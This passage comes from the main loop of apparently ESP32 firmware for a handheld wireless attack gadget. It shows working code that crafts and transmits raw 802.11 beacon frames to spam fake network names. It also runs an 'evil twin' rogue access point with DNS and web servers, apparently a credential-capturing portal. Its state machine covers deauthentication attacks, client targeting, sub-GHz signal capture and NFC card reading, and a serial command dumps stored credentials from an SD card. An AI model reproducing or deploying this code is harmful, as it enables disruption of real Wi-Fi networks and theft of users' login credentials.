      frame[p++]=0x64; frame[p++]=0x00; frame[p++]=0x31; frame[p++]=0x04;
      frame[p++]=0x00; frame[p++]=ssidLen;
      memcpy(&frame[p],spamSSIDs[beaconSSIDIdx],ssidLen); p+=ssidLen;
      frame[p++]=0x01; frame[p++]=0x08;
      frame[p++]=0x82; frame[p++]=0x84; frame[p++]=0x8b; frame[p++]=0x96;
      frame[p++]=0x24; frame[p++]=0x30; frame[p++]=0x48; frame[p++]=0x6c;
      frame[p++]=0x03; frame[p++]=0x01; frame[p++]=ch;
      esp_err_t r=esp_wifi_80211_tx(WIFI_IF_AP,frame,p,false);
      beaconFrameCount++; lastBeaconSend=millis();
      if(beaconFrameCount%20==0) Serial.printf("[BEACON] ssid=\"%s\" ch=%d total=%d tx=%s\n",spamSSIDs[beaconSSIDIdx],ch,beaconFrameCount,r==ESP_OK?"OK":"FAIL");
      beaconSSIDIdx++;
      if(beaconSSIDIdx>=spamSSIDCount) {
        beaconSSIDIdx=0;
        beaconChannelIdx=(beaconChannelIdx+1)%3;
        esp_wifi_set_channel(beaconChannels[beaconChannelIdx],WIFI_SECOND_CHAN_NONE);
        drawBeaconSpam();
      }
    }
  }

  if (currentState==STATE_ET_RUNNING && etActive) {
    dnsServer.processNextRequest();
    webServer.handleClient();
    if (millis()-lastEtDraw>2000) { drawEvilTwinRunning(); lastEtDraw=millis(); }
  }

  if (currentState == STATE_NFC && nfcReady && millis() - nfcLastScan > 600) {
    Wire.beginTransmission(0x24);
    if (Wire.endTransmission() == 0) nfcReadCard();  // PN532 on bus → try read (50ms block)
    nfcLastScan = millis();
  }

  if (currentState==STATE_SUBGHZ && sgListening && cc1101Ok && sgArmed) {
    if (millis() - sgArmTime > 1500) {
      sgArmed = false;
      triggerReaction(MOOD_SAD, "No signal", "try again");
    } else if (digitalRead(4)) {
      captureRawSignal();
      sgArmed = false;
    }
  }

  // === NORMAL SCREEN DRAW ===
  if (currentState!=STATE_PACKET_MONITOR &&
      currentState!=STATE_DEAUTH_ATTACK  &&
      currentState!=STATE_BEACON_SPAM    &&
      currentState!=STATE_ET_RUNNING) {
    switch (currentState) {
      case STATE_MENU:                 drawMenu(); break;
      case STATE_WIFI_RESULTS:         drawWifiResults(); break;
      case STATE_PROBE_SNIFF:          drawProbeSniffer(); break;
      case STATE_DEAUTH_DETECT:        drawDeauthDetector(); break;
      case STATE_DEAUTH_TARGET:        drawDeauthTargetSelect(); break;
      case STATE_DEAUTH_CLIENT_SCAN:   drawClientScan(); break;
      case STATE_DEAUTH_CLIENT_SELECT: drawClientSelect(); break;
      case STATE_ET_TARGET:            drawEvilTwinTarget(); break;
      case STATE_SUBGHZ:  drawSubGhz(); break;
      case STATE_NFC:     drawNFC(); break;
      case STATE_IR:      drawPlaceholder("IR Remote",  "Coming soon..."); break;
      case STATE_ABOUT:   drawAbout(); break;
      default: break;
    }
  }

  // === INPUT ===
  char input = 0;
  if (Serial.available()) { char c=Serial.read(); if(c=='r') sdPrintAllCreds(); else input=c; }
  if (!input) input = readButtons();
  if (input) { lastInputTime=millis(); handleInput(input); }

  delay(30);
}